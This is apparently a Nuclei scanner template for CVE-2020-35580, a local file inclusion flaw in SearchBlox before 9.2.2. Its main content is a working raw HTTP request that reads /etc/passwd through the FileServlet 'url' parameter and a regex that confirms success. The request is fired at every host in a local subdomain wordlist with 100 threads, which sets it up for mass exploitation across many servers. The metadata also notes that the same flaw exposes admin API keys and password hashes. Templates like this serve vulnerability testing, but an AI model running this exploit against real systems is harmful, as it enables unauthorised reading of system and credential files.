id: CVE-2020-35580

info:
  name: SearchBlox < 9.2.2 - Local File Inclusion (LFI)
  author: daffainfo
  severity: high
  description: Local File Inclusion vulnerability in the FileServlet in all SearchBlox before 9.2.2 allows remote, unauthenticated users to read arbitrary files from the operating system via a /searchblox/servlet/FileServlet?col=url= request. Additionally, this may be used to read the contents of the SearchBlox configuration file (e.g., searchblox/WEB-INF/config.xml), which contains both the Super Admin API key and the base64 encoded SHA1 password hashes of other SearchBlox users.
  reference: https://hateshape.github.io/general/2021/05/11/CVE-2020-35580.html
  tags: cve,cve2020,lfi

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /searchblox/servlet/FileServlet?col=9&url=/etc/passwd HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0"
        part: body
